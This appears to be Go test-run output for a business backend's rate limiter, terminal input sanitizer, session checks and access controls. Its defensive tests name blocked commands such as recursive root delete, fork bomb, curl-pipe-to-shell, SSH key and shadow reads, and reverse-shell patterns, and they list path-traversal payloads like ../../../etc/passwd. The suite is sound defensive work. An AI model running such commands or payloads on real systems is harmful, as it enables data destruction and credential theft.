+=== RUN   TestJSON
+--- PASS: TestJSON (0.00s)
+=== RUN   TestClone
+--- PASS: TestClone (0.00s)
+=== RUN   TestString
+--- PASS: TestString (0.00s)
+PASS
+ok  	github.com/rhl/businessos-backend/internal/sync/vectorclock	(cached)
+=== RUN   TestDefaultRateLimitConfig
+--- PASS: TestDefaultRateLimitConfig (0.00s)
+=== RUN   TestRateLimiter_AllowMessage
+--- PASS: TestRateLimiter_AllowMessage (0.00s)
+=== RUN   TestRateLimiter_ConnectionLimit
+2026/01/27 10:20:38 [SECURITY] Rate limit: max connections exceeded for user test-use****** (current: 3, max: 3)
+--- PASS: TestRateLimiter_ConnectionLimit (0.29s)
+=== RUN   TestRateLimiter_NoConnectionLimit
+--- PASS: TestRateLimiter_NoConnectionLimit (0.00s)
+=== RUN   TestRateLimiter_CheckMessageSize
+--- PASS: TestRateLimiter_CheckMessageSize (0.00s)
+=== RUN   TestRateLimiter_NoSizeLimit
+--- PASS: TestRateLimiter_NoSizeLimit (0.00s)
+=== RUN   TestRateLimiter_MultipleUsers
+--- PASS: TestRateLimiter_MultipleUsers (0.00s)
+=== RUN   TestRateLimiter_ConcurrentAccess
+--- PASS: TestRateLimiter_ConcurrentAccess (0.07s)
+=== RUN   TestRateLimiter_Cleanup
+--- PASS: TestRateLimiter_Cleanup (0.26s)
+=== RUN   TestRateLimiter_NoCleanupWithActiveConnections
+--- PASS: TestRateLimiter_NoCleanupWithActiveConnections (0.25s)
+=== RUN   TestRateLimiter_UpdateConfig
+--- PASS: TestRateLimiter_UpdateConfig (0.00s)
+=== RUN   TestHTTP429Handler
+--- PASS: TestHTTP429Handler (0.00s)
+=== RUN   TestRateLimitMiddleware
+--- PASS: TestRateLimitMiddleware (0.00s)
+=== RUN   TestGetRateLimiter_Singleton
+--- PASS: TestGetRateLimiter_Singleton (0.00s)
+=== RUN   TestRateLimiter_Reserve
+--- PASS: TestRateLimiter_Reserve (0.00s)
+=== RUN   TestDangerousCommandDetection
+2026/01/27 10:20:38 [Sanitizer] Initialized with 25 command patterns and 13 escape patterns
+=== RUN   TestDangerousCommandDetection/rm_-rf_/
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command severity=critical risk=100 detail="Recursive delete from root/home"
+=== RUN   TestDangerousCommandDetection/rm_-rf_root
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command severity=critical risk=100 detail="Recursive delete from root/home"
+=== RUN   TestDangerousCommandDetection/rm_recursive_home
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command severity=critical risk=100 detail="Recursive delete from root/home"
+=== RUN   TestDangerousCommandDetection/rm_with_wildcard
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command severity=critical risk=95 detail="Wildcard delete"
+=== RUN   TestDangerousCommandDetection/fork_bomb
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command severity=critical risk=100 detail="Fork bomb"
+=== RUN   TestDangerousCommandDetection/dd_to_disk
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command severity=critical risk=100 detail="Direct disk write"
+=== RUN   TestDangerousCommandDetection/mkfs_format
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command severity=critical risk=100 detail="Filesystem format"
+=== RUN   TestDangerousCommandDetection/proc_escape
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command severity=critical risk=100 detail="Proc filesystem escape attempt"
+=== RUN   TestDangerousCommandDetection/nsenter_escape
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command severity=critical risk=100 detail="Namespace escape attempt"
+=== RUN   TestDangerousCommandDetection/docker_socket
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command severity=critical risk=100 detail="Docker socket access"
+=== RUN   TestDangerousCommandDetection/privileged_container
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command severity=critical risk=100 detail="Privileged container spawn"
+=== RUN   TestDangerousCommandDetection/chmod_777
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command severity=high risk=80 detail="Insecure permissions"
+=== RUN   TestDangerousCommandDetection/chmod_recursive_777
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command severity=high risk=80 detail="Insecure permissions"
+=== RUN   TestDangerousCommandDetection/curl_pipe_bash
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command severity=high risk=85 detail="Curl pipe to shell"
+=== RUN   TestDangerousCommandDetection/wget_pipe_sh
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command severity=high risk=85 detail="Wget pipe to shell"
+=== RUN   TestDangerousCommandDetection/cat_ssh_key
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command severity=high risk=80 detail="Sensitive file read"
+=== RUN   TestDangerousCommandDetection/cat_passwd
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command severity=high risk=80 detail="Sensitive file read"
+=== RUN   TestDangerousCommandDetection/cat_shadow
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command severity=high risk=80 detail="Sensitive file read"
+=== RUN   TestDangerousCommandDetection/cat_env_file
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command severity=high risk=80 detail="Sensitive file read"
+=== RUN   TestDangerousCommandDetection/export_secret
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command severity=high risk=75 detail="Secret export"
+=== RUN   TestDangerousCommandDetection/export_password
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command severity=high risk=75 detail="Secret export"
+=== RUN   TestDangerousCommandDetection/netcat_listener
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command_warn severity=medium risk=60 detail="Netcat listener"
+=== RUN   TestDangerousCommandDetection/netcat_exec
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command_warn severity=medium risk=60 detail="Netcat listener"
+=== RUN   TestDangerousCommandDetection/python_socket
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command_warn severity=medium risk=65 detail="Python reverse shell pattern"
+=== RUN   TestDangerousCommandDetection/base64_decode
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command_warn severity=medium risk=50 detail="Base64 decode (obfuscation)"
+=== RUN   TestDangerousCommandDetection/history_clear
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=dangerous_command_warn severity=medium risk=55 detail="History clear attempt"
+=== RUN   TestDangerousCommandDetection/simple_ls
+=== RUN   TestDangerousCommandDetection/cat_regular_file
+=== RUN   TestDangerousCommandDetection/echo_hello
+=== RUN   TestDangerousCommandDetection/pwd
+=== RUN   TestDangerousCommandDetection/date
+=== RUN   TestDangerousCommandDetection/whoami
+=== RUN   TestDangerousCommandDetection/cd_directory
+=== RUN   TestDangerousCommandDetection/mkdir
+=== RUN   TestDangerousCommandDetection/grep_pattern
+=== RUN   TestDangerousCommandDetection/curl_get_json
+=== RUN   TestDangerousCommandDetection/npm_install
+=== RUN   TestDangerousCommandDetection/git_status
+=== RUN   TestDangerousCommandDetection/python_script
+--- PASS: TestDangerousCommandDetection (0.00s)
+    --- PASS: TestDangerousCommandDetection/rm_-rf_/ (0.00s)
+    --- PASS: TestDangerousCommandDetection/rm_-rf_root (0.00s)
+    --- PASS: TestDangerousCommandDetection/rm_recursive_home (0.00s)
+    --- PASS: TestDangerousCommandDetection/rm_with_wildcard (0.00s)
+    --- PASS: TestDangerousCommandDetection/fork_bomb (0.00s)
+    --- PASS: TestDangerousCommandDetection/dd_to_disk (0.00s)
+    --- PASS: TestDangerousCommandDetection/mkfs_format (0.00s)
+    --- PASS: TestDangerousCommandDetection/proc_escape (0.00s)
+    --- PASS: TestDangerousCommandDetection/nsenter_escape (0.00s)
+    --- PASS: TestDangerousCommandDetection/docker_socket (0.00s)
+    --- PASS: TestDangerousCommandDetection/privileged_container (0.00s)
+    --- PASS: TestDangerousCommandDetection/chmod_777 (0.00s)
+    --- PASS: TestDangerousCommandDetection/chmod_recursive_777 (0.00s)
+    --- PASS: TestDangerousCommandDetection/curl_pipe_bash (0.00s)
+    --- PASS: TestDangerousCommandDetection/wget_pipe_sh (0.00s)
+    --- PASS: TestDangerousCommandDetection/cat_ssh_key (0.00s)
+    --- PASS: TestDangerousCommandDetection/cat_passwd (0.00s)
+    --- PASS: TestDangerousCommandDetection/cat_shadow (0.00s)
+    --- PASS: TestDangerousCommandDetection/cat_env_file (0.00s)
+    --- PASS: TestDangerousCommandDetection/export_secret (0.00s)
+    --- PASS: TestDangerousCommandDetection/export_password (0.00s)
+    --- PASS: TestDangerousCommandDetection/netcat_listener (0.00s)
+    --- PASS: TestDangerousCommandDetection/netcat_exec (0.00s)
+    --- PASS: TestDangerousCommandDetection/python_socket (0.00s)
+    --- PASS: TestDangerousCommandDetection/base64_decode (0.00s)
+    --- PASS: TestDangerousCommandDetection/history_clear (0.00s)
+    --- PASS: TestDangerousCommandDetection/simple_ls (0.00s)
+    --- PASS: TestDangerousCommandDetection/cat_regular_file (0.00s)
+    --- PASS: TestDangerousCommandDetection/echo_hello (0.00s)
+    --- PASS: TestDangerousCommandDetection/pwd (0.00s)
+    --- PASS: TestDangerousCommandDetection/date (0.00s)
+    --- PASS: TestDangerousCommandDetection/whoami (0.00s)
+    --- PASS: TestDangerousCommandDetection/cd_directory (0.00s)
+    --- PASS: TestDangerousCommandDetection/mkdir (0.00s)
+    --- PASS: TestDangerousCommandDetection/grep_pattern (0.00s)
+    --- PASS: TestDangerousCommandDetection/curl_get_json (0.00s)
+    --- PASS: TestDangerousCommandDetection/npm_install (0.00s)
+    --- PASS: TestDangerousCommandDetection/git_status (0.00s)
+    --- PASS: TestDangerousCommandDetection/python_script (0.00s)
+=== RUN   TestEscapeSequenceFiltering
+2026/01/27 10:20:38 [Sanitizer] Initialized with 25 command patterns and 13 escape patterns
+=== RUN   TestEscapeSequenceFiltering/OSC_title_change
+=== RUN   TestEscapeSequenceFiltering/OSC_clipboard
+=== RUN   TestEscapeSequenceFiltering/cursor_position
+=== RUN   TestEscapeSequenceFiltering/clear_screen
+=== RUN   TestEscapeSequenceFiltering/alternate_buffer
+=== RUN   TestEscapeSequenceFiltering/hide_cursor
+=== RUN   TestEscapeSequenceFiltering/plain_text
+=== RUN   TestEscapeSequenceFiltering/with_newlines
+=== RUN   TestEscapeSequenceFiltering/with_tabs
+=== RUN   TestEscapeSequenceFiltering/json_data
+=== RUN   TestEscapeSequenceFiltering/path
+--- PASS: TestEscapeSequenceFiltering (0.00s)
+    --- PASS: TestEscapeSequenceFiltering/OSC_title_change (0.00s)
+    --- PASS: TestEscapeSequenceFiltering/OSC_clipboard (0.00s)
+    --- PASS: TestEscapeSequenceFiltering/cursor_position (0.00s)
+    --- PASS: TestEscapeSequenceFiltering/clear_screen (0.00s)
+    --- PASS: TestEscapeSequenceFiltering/alternate_buffer (0.00s)
+    --- PASS: TestEscapeSequenceFiltering/hide_cursor (0.00s)
+    --- PASS: TestEscapeSequenceFiltering/plain_text (0.00s)
+    --- PASS: TestEscapeSequenceFiltering/with_newlines (0.00s)
+    --- PASS: TestEscapeSequenceFiltering/with_tabs (0.00s)
+    --- PASS: TestEscapeSequenceFiltering/json_data (0.00s)
+    --- PASS: TestEscapeSequenceFiltering/path (0.00s)
+=== RUN   TestNullByteInjection
+2026/01/27 10:20:38 [Sanitizer] Initialized with 25 command patterns and 13 escape patterns
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=null_byte_injection severity=critical risk=90 detail=""
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=null_byte_injection severity=critical risk=90 detail=""
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=null_byte_injection severity=critical risk=90 detail=""
+2026/01/27 10:20:38 [Security] Input blocked: user=test-use*** reason=null_byte_injection severity=critical risk=90 detail=""
+--- PASS: TestNullByteInjection (0.00s)
+=== RUN   TestInputLengthLimit
+2026/01/27 10:20:38 [Sanitizer] Initialized with 25 command patterns and 13 escape patterns
+2026/01/27 10:20:38 [Security] Input blocked: user=user reason=length_exceeded severity=warning risk=40 detail="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa..."
+--- PASS: TestInputLengthLimit (0.00s)
+=== RUN   TestQuickValidate
+--- PASS: TestQuickValidate (0.00s)
+=== RUN   TestPassthroughMode
+2026/01/27 10:20:38 [Sanitizer] Initialized with 25 command patterns and 13 escape patterns
+--- PASS: TestPassthroughMode (0.00s)
+=== RUN   TestConcurrency
+2026/01/27 10:20:38 [Sanitizer] Initialized with 25 command patterns and 13 escape patterns
+2026/01/27 10:20:38 [Security] Input blocked: user=user reason=null_byte_injection severity=critical risk=90 detail=""
+--- PASS: TestConcurrency (0.00s)
+=== RUN   TestContainerEscapePatterns
+2026/01/27 10:20:38 [Sanitizer] Initialized with 25 command patterns and 13 escape patterns
+2026/01/27 10:20:38 [Security] Input blocked: user=user reason=dangerous_command severity=critical risk=100 detail="Proc filesystem escape attempt"
+2026/01/27 10:20:38 [Security] Input blocked: user=user reason=dangerous_command severity=critical risk=100 detail="Namespace escape attempt"
+2026/01/27 10:20:38 [Security] Input blocked: user=user reason=dangerous_command severity=critical risk=100 detail="Docker volume mount escape"
+2026/01/27 10:20:38 [Security] Input blocked: user=user reason=dangerous_command severity=critical risk=100 detail="Docker socket access"
+2026/01/27 10:20:38 [Security] Input blocked: user=user reason=dangerous_command severity=critical risk=100 detail="Mount escape attempt"
+--- PASS: TestContainerEscapePatterns (0.00s)
+=== RUN   TestDefaultSessionSecurityConfig
+--- PASS: TestDefaultSessionSecurityConfig (0.00s)
+=== RUN   TestSession_IsExpired
+=== RUN   TestSession_IsExpired/zero_expiration
+=== RUN   TestSession_IsExpired/future_expiration
+=== RUN   TestSession_IsExpired/past_expiration
+--- PASS: TestSession_IsExpired (0.00s)
+    --- PASS: TestSession_IsExpired/zero_expiration (0.00s)
+    --- PASS: TestSession_IsExpired/future_expiration (0.00s)
+    --- PASS: TestSession_IsExpired/past_expiration (0.00s)
+=== RUN   TestSession_IsIdle
+=== RUN   TestSession_IsIdle/recent_activity
+=== RUN   TestSession_IsIdle/old_activity
+=== RUN   TestSession_IsIdle/just_before_timeout
+=== RUN   TestSession_IsIdle/past_timeout
+--- PASS: TestSession_IsIdle (0.00s)
+    --- PASS: TestSession_IsIdle/recent_activity (0.00s)
+    --- PASS: TestSession_IsIdle/old_activity (0.00s)
+    --- PASS: TestSession_IsIdle/just_before_timeout (0.00s)
+    --- PASS: TestSession_IsIdle/past_timeout (0.00s)
+=== RUN   TestSession_ValidateIP
+=== RUN   TestSession_ValidateIP/ip_binding_disabled
+=== RUN   TestSession_ValidateIP/exact_ip_match
+=== RUN   TestSession_ValidateIP/ip_mismatch_-_strict_mode
+=== RUN   TestSession_ValidateIP/subnet_match_-_migration_enabled
+=== RUN   TestSession_ValidateIP/different_subnet_-_migration_enabled
+=== RUN   TestSession_ValidateIP/completely_different_network
+=== RUN   TestSession_ValidateIP/empty_session_IP
+--- PASS: TestSession_ValidateIP (0.00s)
+    --- PASS: TestSession_ValidateIP/ip_binding_disabled (0.00s)
+    --- PASS: TestSession_ValidateIP/exact_ip_match (0.00s)
+    --- PASS: TestSession_ValidateIP/ip_mismatch_-_strict_mode (0.00s)
+    --- PASS: TestSession_ValidateIP/subnet_match_-_migration_enabled (0.00s)
+    --- PASS: TestSession_ValidateIP/different_subnet_-_migration_enabled (0.00s)
+    --- PASS: TestSession_ValidateIP/completely_different_network (0.00s)
+    --- PASS: TestSession_ValidateIP/empty_session_IP (0.00s)
+=== RUN   TestExtractSubnet
+=== RUN   TestExtractSubnet/192.168.1.100
+=== RUN   TestExtractSubnet/10.0.0.1
+=== RUN   TestExtractSubnet/172.16.0.1
+=== RUN   TestExtractSubnet/127.0.0.1
+=== RUN   TestExtractSubnet/2001:db8:85a3:0000:0000:8a2e:0370:7334
+=== RUN   TestExtractSubnet/::1
+=== RUN   TestExtractSubnet/short
+--- PASS: TestExtractSubnet (0.00s)
+    --- PASS: TestExtractSubnet/192.168.1.100 (0.00s)
+    --- PASS: TestExtractSubnet/10.0.0.1 (0.00s)
+    --- PASS: TestExtractSubnet/172.16.0.1 (0.00s)
+    --- PASS: TestExtractSubnet/127.0.0.1 (0.00s)
+    --- PASS: TestExtractSubnet/2001:db8:85a3:0000:0000:8a2e:0370:7334 (0.00s)
+    --- PASS: TestExtractSubnet/::1 (0.00s)
+    --- PASS: TestExtractSubnet/short (0.00s)
+=== RUN   TestSplitIP
+=== RUN   TestSplitIP/192.168.1.100
+=== RUN   TestSplitIP/10.0.0.1
+=== RUN   TestSplitIP/2001:db8::1
+=== RUN   TestSplitIP/localhost
+--- PASS: TestSplitIP (0.00s)
+    --- PASS: TestSplitIP/192.168.1.100 (0.00s)
+    --- PASS: TestSplitIP/10.0.0.1 (0.00s)
+    --- PASS: TestSplitIP/2001:db8::1 (0.00s)
+    --- PASS: TestSplitIP/localhost (0.00s)
+=== RUN   TestSession_IsContainerized
+=== RUN   TestSession_IsContainerized/with_container
+=== RUN   TestSession_IsContainerized/without_container
+--- PASS: TestSession_IsContainerized (0.00s)
+    --- PASS: TestSession_IsContainerized/with_container (0.00s)
+    --- PASS: TestSession_IsContainerized/without_container (0.00s)
+=== RUN   TestSession_SecurityFields
+--- PASS: TestSession_SecurityFields (0.00s)
+PASS
+ok  	github.com/rhl/businessos-backend/internal/terminal	(cached)
+=== RUN   TestSetupTestDatabase
+    containers_test.go:23: Test database not available - set TEST_DATABASE_URL or run local postgres on default port
+--- SKIP: TestSetupTestDatabase (0.31s)
+=== RUN   TestSetupTestRedis
+--- PASS: TestSetupTestRedis (0.12s)
+=== RUN   TestRequireTestDatabase
+    containers_test.go:81: Test database not available
+--- SKIP: TestRequireTestDatabase (0.11s)
+=== RUN   TestRequireTestRedis
+--- PASS: TestRequireTestRedis (0.01s)
+=== RUN   TestCleanupTestData
+    containers_test.go:117: Test database not available
+--- SKIP: TestCleanupTestData (0.15s)
+PASS
+ok  	github.com/rhl/businessos-backend/internal/testutil	(cached)
+=== RUN   TestAgentToolInterface
+--- PASS: TestAgentToolInterface (0.00s)
+=== RUN   TestToolNames
+--- PASS: TestToolNames (0.00s)
+=== RUN   TestToolDescriptions
+--- PASS: TestToolDescriptions (0.00s)
+=== RUN   TestToolInputSchemas
+--- PASS: TestToolInputSchemas (0.00s)
+=== RUN   TestCreateTaskToolSchema
+--- PASS: TestCreateTaskToolSchema (0.00s)
+=== RUN   TestQueryMetricsToolSchema
+--- PASS: TestQueryMetricsToolSchema (0.00s)
+=== RUN   TestMoveTaskToolSchema
+--- PASS: TestMoveTaskToolSchema (0.00s)
+=== RUN   TestToolExecuteWithoutPool
+--- PASS: TestToolExecuteWithoutPool (0.00s)
+PASS
+ok  	github.com/rhl/businessos-backend/internal/tools	(cached)
+?   	github.com/rhl/businessos-backend/internal/utils	[no test files]
+?   	github.com/rhl/businessos-backend/internal/webhooks	[no test files]
+FAIL	github.com/rhl/businessos-backend/internal/workers [build failed]
+FAIL	github.com/rhl/businessos-backend/scripts [build failed]
+FAIL	github.com/rhl/businessos-backend/scripts/archive/debug-scripts-2026-01 [build failed]
+?   	github.com/rhl/businessos-backend/scripts/migrations	[no test files]
+FAIL	github.com/rhl/businessos-backend/scripts/tests [build failed]
+FAIL	github.com/rhl/businessos-backend/tests [build failed]
+=== RUN   TestHorizontalPrivilegeEscalation
+=== RUN   TestHorizontalPrivilegeEscalation/Owner_accesses_own_conversation
+=== RUN   TestHorizontalPrivilegeEscalation/User_B_tries_to_access_User_A's_conversation
+=== RUN   TestHorizontalPrivilegeEscalation/Owner_accesses_own_memory
+=== RUN   TestHorizontalPrivilegeEscalation/User_B_tries_to_access_User_A's_memory
+=== RUN   TestHorizontalPrivilegeEscalation/Owner_accesses_own_project
+=== RUN   TestHorizontalPrivilegeEscalation/User_B_tries_to_access_User_A's_project
+=== RUN   TestHorizontalPrivilegeEscalation/Owner_accesses_own_workspace
+=== RUN   TestHorizontalPrivilegeEscalation/User_B_tries_to_access_User_A's_workspace
+--- PASS: TestHorizontalPrivilegeEscalation (0.00s)
+    --- PASS: TestHorizontalPrivilegeEscalation/Owner_accesses_own_conversation (0.00s)
+    --- PASS: TestHorizontalPrivilegeEscalation/User_B_tries_to_access_User_A's_conversation (0.00s)
+    --- PASS: TestHorizontalPrivilegeEscalation/Owner_accesses_own_memory (0.00s)
+    --- PASS: TestHorizontalPrivilegeEscalation/User_B_tries_to_access_User_A's_memory (0.00s)
+    --- PASS: TestHorizontalPrivilegeEscalation/Owner_accesses_own_project (0.00s)
+    --- PASS: TestHorizontalPrivilegeEscalation/User_B_tries_to_access_User_A's_project (0.00s)
+    --- PASS: TestHorizontalPrivilegeEscalation/Owner_accesses_own_workspace (0.00s)
+    --- PASS: TestHorizontalPrivilegeEscalation/User_B_tries_to_access_User_A's_workspace (0.00s)
+=== RUN   TestVerticalPrivilegeEscalation
+=== RUN   TestVerticalPrivilegeEscalation/Admin_delete_user
+=== RUN   TestVerticalPrivilegeEscalation/Regular_User_delete_user
+=== RUN   TestVerticalPrivilegeEscalation/Admin_modify_system_settings
+=== RUN   TestVerticalPrivilegeEscalation/Regular_User_modify_system_settings
+=== RUN   TestVerticalPrivilegeEscalation/Admin_access_all_workspaces
+=== RUN   TestVerticalPrivilegeEscalation/Regular_User_access_all_workspaces
+=== RUN   TestVerticalPrivilegeEscalation/Admin_view_all_users
+=== RUN   TestVerticalPrivilegeEscalation/Regular_User_view_all_users
+=== RUN   TestVerticalPrivilegeEscalation/Admin_modify_rate_limits
+=== RUN   TestVerticalPrivilegeEscalation/Regular_User_modify_rate_limits
+=== RUN   TestVerticalPrivilegeEscalation/Admin_access_admin_panel
+=== RUN   TestVerticalPrivilegeEscalation/Regular_User_access_admin_panel
+--- PASS: TestVerticalPrivilegeEscalation (0.00s)
+    --- PASS: TestVerticalPrivilegeEscalation/Admin_delete_user (0.00s)
+    --- PASS: TestVerticalPrivilegeEscalation/Regular_User_delete_user (0.00s)
+    --- PASS: TestVerticalPrivilegeEscalation/Admin_modify_system_settings (0.00s)
+    --- PASS: TestVerticalPrivilegeEscalation/Regular_User_modify_system_settings (0.00s)
+    --- PASS: TestVerticalPrivilegeEscalation/Admin_access_all_workspaces (0.00s)
+    --- PASS: TestVerticalPrivilegeEscalation/Regular_User_access_all_workspaces (0.00s)
+    --- PASS: TestVerticalPrivilegeEscalation/Admin_view_all_users (0.00s)
+    --- PASS: TestVerticalPrivilegeEscalation/Regular_User_view_all_users (0.00s)
+    --- PASS: TestVerticalPrivilegeEscalation/Admin_modify_rate_limits (0.00s)
+    --- PASS: TestVerticalPrivilegeEscalation/Regular_User_modify_rate_limits (0.00s)
+    --- PASS: TestVerticalPrivilegeEscalation/Admin_access_admin_panel (0.00s)
+    --- PASS: TestVerticalPrivilegeEscalation/Regular_User_access_admin_panel (0.00s)
+=== RUN   TestPathTraversal
+=== RUN   TestPathTraversal/Path_Traversal_../../../etc/passwd
+=== RUN   TestPathTraversal/Path_Traversal_..\..\..\windows\system32
+=== RUN   TestPathTraversal/Path_Traversal_....//....//etc/passwd
+=== RUN   TestPathTraversal/Path_Traversal_..\..\..\.env
+=== RUN   TestPathTraversal/Path_Traversal_../../config/secrets.yaml
+=== RUN   TestPathTraversal/Path_Traversal_../../../../../root/.ssh/
+=== RUN   TestPathTraversal/Path_Traversal_..%2F..%2F..%2Fetc%2Fpass
+=== RUN   TestPathTraversal/Path_Traversal_%2e%2e%2f%2e%2e%2f
+=== RUN   TestPathTraversal/Path_Traversal_..%252f..%252f
+=== RUN   TestPathTraversal/Path_Traversal_/./../../../etc/passwd
+--- PASS: TestPathTraversal (0.00s)
+    --- PASS: TestPathTraversal/Path_Traversal_../../../etc/passwd (0.00s)
+    --- PASS: TestPathTraversal/Path_Traversal_..\..\..\windows\system32 (0.00s)
+    --- PASS: TestPathTraversal/Path_Traversal_....//....//etc/passwd (0.00s)
+    --- PASS: TestPathTraversal/Path_Traversal_..\..\..\.env (0.00s)
+    --- PASS: TestPathTraversal/Path_Traversal_../../config/secrets.yaml (0.00s)
+    --- PASS: TestPathTraversal/Path_Traversal_../../../../../root/.ssh/ (0.00s)
+    --- PASS: TestPathTraversal/Path_Traversal_..%2F..%2F..%2Fetc%2Fpass (0.00s)
+    --- PASS: TestPathTraversal/Path_Traversal_%2e%2e%2f%2e%2e%2f (0.00s)
+    --- PASS: TestPathTraversal/Path_Traversal_..%252f..%252f (0.00s)
+    --- PASS: TestPathTraversal/Path_Traversal_/./../../../etc/passwd (0.00s)
+=== RUN   TestIDOR
+=== RUN   TestIDOR/User_A_accesses_own_resource
+=== RUN   TestIDOR/User_B_accesses_own_resource
+=== RUN   TestIDOR/User_B_tries_to_access_User_A's_resource
+=== RUN   TestIDOR/User_A_tries_to_access_User_B's_resource
+--- PASS: TestIDOR (0.00s)
+    --- PASS: TestIDOR/User_A_accesses_own_resource (0.00s)
+    --- PASS: TestIDOR/User_B_accesses_own_resource (0.00s)
+    --- PASS: TestIDOR/User_B_tries_to_access_User_A's_resource (0.00s)
+    --- PASS: TestIDOR/User_A_tries_to_access_User_B's_resource (0.00s)
+=== RUN   TestWorkspaceIsolation
+=== RUN   TestWorkspaceIsolation/User_in_Workspace_A_accesses_resource_in_A
+=== RUN   TestWorkspaceIsolation/User_in_Workspace_B_accesses_resource_in_B
+=== RUN   TestWorkspaceIsolation/User_in_Workspace_A_tries_to_access_resource_in_B
+=== RUN   TestWorkspaceIsolation/User_in_Workspace_B_tries_to_access_resource_in_A
+--- PASS: TestWorkspaceIsolation (0.00s)
+    --- PASS: TestWorkspaceIsolation/User_in_Workspace_A_accesses_resource_in_A (0.00s)
+    --- PASS: TestWorkspaceIsolation/User_in_Workspace_B_accesses_resource_in_B (0.00s)
+    --- PASS: TestWorkspaceIsolation/User_in_Workspace_A_tries_to_access_resource_in_B (0.00s)
+    --- PASS: TestWorkspaceIsolation/User_in_Workspace_B_tries_to_access_resource_in_A (0.00s)
+=== RUN   TestRoleBasedAccess
+=== RUN   TestRoleBasedAccess/admin_create_workspace
+=== RUN   TestRoleBasedAccess/admin_delete_workspace
+=== RUN   TestRoleBasedAccess/admin_manage_users
+=== RUN   TestRoleBasedAccess/member_create_workspace
+=== RUN   TestRoleBasedAccess/member_delete_workspace
+=== RUN   TestRoleBasedAccess/member_manage_users
+=== RUN   TestRoleBasedAccess/member_create_project
+=== RUN   TestRoleBasedAccess/member_view_workspace
+=== RUN   TestRoleBasedAccess/viewer_create_project
+=== RUN   TestRoleBasedAccess/viewer_view_workspace
+=== RUN   TestRoleBasedAccess/viewer_edit_project
+--- PASS: TestRoleBasedAccess (0.00s)
+    --- PASS: TestRoleBasedAccess/admin_create_workspace (0.00s)
+    --- PASS: TestRoleBasedAccess/admin_delete_workspace (0.00s)
+    --- PASS: TestRoleBasedAccess/admin_manage_users (0.00s)
+    --- PASS: TestRoleBasedAccess/member_create_workspace (0.00s)
+    --- PASS: TestRoleBasedAccess/member_delete_workspace (0.00s)
+    --- PASS: TestRoleBasedAccess/member_manage_users (0.00s)
+    --- PASS: TestRoleBasedAccess/member_create_project (0.00s)
+    --- PASS: TestRoleBasedAccess/member_view_workspace (0.00s)
+    --- PASS: TestRoleBasedAccess/viewer_create_project (0.00s)
+    --- PASS: TestRoleBasedAccess/viewer_view_workspace (0.00s)
+    --- PASS: TestRoleBasedAccess/viewer_edit_project (0.00s)
+=== RUN   TestDirectObjectReferenceEnumeration
+=== RUN   TestDirectObjectReferenceEnumeration/Sequential_IDs_should_not_be_used
+=== RUN   TestDirectObjectReferenceEnumeration/Predictable_patterns_rejected
+--- PASS: TestDirectObjectReferenceEnumeration (0.00s)
+    --- PASS: TestDirectObjectReferenceEnumeration/Sequential_IDs_should_not_be_used (0.00s)
+    --- PASS: TestDirectObjectReferenceEnumeration/Predictable_patterns_rejected (0.00s)
+=== RUN   TestAPIEndpointAccessControl
+=== RUN   TestAPIEndpointAccessControl/Public_endpoints_accessible_without_auth
+=== RUN   TestAPIEndpointAccessControl/Protected_endpoints_require_authentication
+=== RUN   TestAPIEndpointAccessControl/Admin_endpoints_require_admin_role
+--- PASS: TestAPIEndpointAccessControl (0.00s)
+    --- PASS: TestAPIEndpointAccessControl/Public_endpoints_accessible_without_auth (0.00s)
+    --- PASS: TestAPIEndpointAccessControl/Protected_endpoints_require_authentication (0.00s)
+    --- PASS: TestAPIEndpointAccessControl/Admin_endpoints_require_admin_role (0.00s)
+=== RUN   TestPasswordHashing
+=== RUN   TestPasswordHashing/Hash_SecurePassword123!
+=== RUN   TestPasswordHashing/Hash_MyP@ssw0rd2024
+=== RUN   TestPasswordHashing/Hash_Complex!ty#9999
+--- PASS: TestPasswordHashing (1.86s)
+    --- PASS: TestPasswordHashing/Hash_SecurePassword123! (0.62s)
+    --- PASS: TestPasswordHashing/Hash_MyP@ssw0rd2024 (0.62s)
+    --- PASS: TestPasswordHashing/Hash_Complex!ty#9999 (0.62s)
+=== RUN   TestPasswordPolicy
+=== RUN   TestPasswordPolicy/Valid_password
+=== RUN   TestPasswordPolicy/Too_short
+=== RUN   TestPasswordPolicy/No_number
+=== RUN   TestPasswordPolicy/No_special_char
+=== RUN   TestPasswordPolicy/No_uppercase
+=== RUN   TestPasswordPolicy/Empty
+=== RUN   TestPasswordPolicy/Only_numbers
